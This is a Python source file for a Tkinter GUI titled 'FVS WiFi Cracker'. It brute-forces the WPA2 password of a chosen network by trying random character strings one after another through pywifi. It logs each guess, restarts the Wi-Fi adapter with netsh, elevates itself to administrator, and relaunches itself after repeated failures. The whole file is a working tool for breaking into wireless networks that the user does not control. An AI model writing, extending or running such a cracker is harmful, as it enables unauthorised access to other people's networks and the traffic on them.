import time
from pywifi import const, PyWiFi, Profile
import random
import json
import tkinter as tk
import ctypes
import sys
import os
import subprocess
from numba import jit
import string

root = tk.Tk()
root.title("FVS WiFi Cracker")
root.configure(bg="black")

output_text = tk.Text(root, height=10, width=50, wrap=tk.WORD, fg="green", bg="black")
output_text.pack()


def save_settings():
    settings = {
        'ssid': ssid_entry.get(),
        'all_length': all_length_entry.get(),
        'letters_length': letters_length_entry.get(),
        'numbers_length': numbers_length_entry.get(),
        'special_characters_length': special_characters_entry.get()
    }
    with open('settings.json', 'w') as file:
        json.dump(settings, file)


# Load settings from a file
def load_settings():
    try:
        with open('settings.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}


def auto_click_connect():
    connect_button.invoke()


# Place this block at the beginning of your script, after defining the above function
if "--auto-connect" in sys.argv:
    root.after(1000, auto_click_connect)  # schedule auto_click_connect to be called after 1000 milliseconds

settings = load_settings()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

should_continue = True

speed_delay = 0.1


def stop_connection():
    global should_continue
    should_continue = False
    save_settings()  # Save settings before stopping
    output_text.insert(tk.END, "Stopping connection attempts.\n")


def generate_random_string(all_length, letters_length, numbers_length, special_characters_length):
    letters = string.ascii_letters
    numbers = string.digits
    special_characters = "!@#$%^&*()_-+=<>?"

    generated_letters = ''.join([random.choice(letters) for _ in range(letters_length)])
    generated_numbers = ''.join([random.choice(numbers) for _ in range(numbers_length)])
    generated_special_characters = ''.join([random.choice(special_characters) for _ in range(special_characters_length)])

    # Combine the generated strings
    random_string = generated_letters + generated_numbers + generated_special_characters

    # If all_length is defined, fill the remaining characters with a mix of all characters
    remaining_length = all_length - len(random_string)
    all_characters = letters + numbers + special_characters
    random_string += ''.join([random.choice(all_characters) for _ in range(remaining_length)])

    # Shuffle the string to ensure randomness
    random_string = ''.join(random.sample(random_string, len(random_string)))

    return random_string


def connect_to_wifi(ssid, password, output_text):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    profile = iface.add_network_profile(profile)
    iface.connect(profile)

    for _ in range(10):
        time.sleep(1)
        if iface.status() == const.IFACE_CONNECTED:
            output_text.insert(tk.END, f"Connected to {ssid} successfully!\nSSID: {ssid}\nPassword: {password}\n")
            return True

    output_text.insert(tk.END, f"Failed to connect to {ssid}.\n")
    return False


def restart_wifi_interface():
    os.system('netsh interface set interface "Wi-Fi" admin=disable')
    time.sleep(2)
    os.system('netsh interface set interface "Wi-Fi" admin=enable')
    time.sleep(5)


def try_to_connect():
    global should_continue
    should_continue = True
    ssid_input = ssid_entry.get()
    input_all_length = int(all_length_entry.get()) if all_length_entry.get() else 0
    input_letters_length = int(letters_length_entry.get()) if letters_length_entry.get() else 0
    input_numbers_length = int(numbers_length_entry.get()) if numbers_length_entry.get() else 0
    input_special_characters_length = int(special_characters_entry.get()) if special_characters_entry.get() else 0

    failure_count = 0  # Initialize failure_count
    previous_attempts = {}
    try:
        with open('output.json', 'r') as file:
            previous_attempts = json.load(file)
    except:
        pass

    while should_continue:
        gen_password = generate_random_string(input_all_length, input_letters_length, input_numbers_length,
                                              input_special_characters_length)

        # Check if password already attempted
        if gen_password in previous_attempts.get(ssid_input, []):
            continue

        # Store attempt
        previous_attempts.setdefault(ssid_input, []).append(gen_password)  # Use setdefault to handle new SSIDs

        with open('output.json', 'w') as file:
            json.dump(previous_attempts, file)

        output_text.insert(tk.END, f"Password generated: {gen_password}\nOutput written to output.json\n")
        output_text.see(tk.END)

        if connect_to_wifi(ssid_input, gen_password, output_text):
            failure_count = 0  # Reset the failure_count when connection is successful
            break
        else:
            failure_count += 1  # Increment the failure_count when connection fails

        # If consecutive failures reach a threshold, restart the entire script
        if failure_count >= 20:  # You can adjust this number as needed
            output_text.insert(tk.END, "Multiple failures detected. Restarting the script...\n")
            save_settings()  # Save the current settings before restarting
            subprocess.Popen([sys.executable, sys.argv[0], "--auto-connect"])
            sys.exit(0)

        root.update()  # Allow the GUI to update


def create_label(text):
    return tk.Label(root, text=text, fg="green", bg="black")


def create_entry():
    return tk.Entry(root, fg="green", bg="black")


ssid_label = create_label("SSID:")
ssid_label.pack()
ssid_entry = create_entry()
ssid_entry.insert(0, settings.get('ssid', ''))
ssid_entry.pack()

all_length_label = create_label("Total Length:")
all_length_label.pack()
all_length_entry = create_entry()
all_length_entry.insert(0, settings.get('all_length', ''))
all_length_entry.pack()

letters_length_label = create_label("Letters Length:")
letters_length_label.pack()
letters_length_entry = create_entry()
letters_length_entry.insert(0, settings.get('letters_length', ''))
letters_length_entry.pack()

numbers_length_label = create_label("Numbers Length:")
numbers_length_label.pack()
numbers_length_entry = create_entry()
numbers_length_entry.insert(0, settings.get('numbers_length', ''))
numbers_length_entry.pack()

special_characters_label = create_label("Special Characters Length:")
special_characters_label.pack()
special_characters_entry = create_entry()
special_characters_entry.insert(0, settings.get('special_characters_length', ''))
special_characters_entry.pack()

control_frame = tk.Frame(root, bg="black")
control_frame.pack()

connect_button = tk.Button(control_frame, text="Connect", command=try_to_connect, fg="green", bg="black")
connect_button.grid(row=0, column=0)

stop_button = tk.Button(control_frame, text="Stop", command=stop_connection, fg="green", bg="black")
stop_button.grid(row=0, column=1)

# Create a frame for the speed buttons
speed_frame = tk.Frame(root, bg="black")
speed_frame.pack()

root.mainloop()
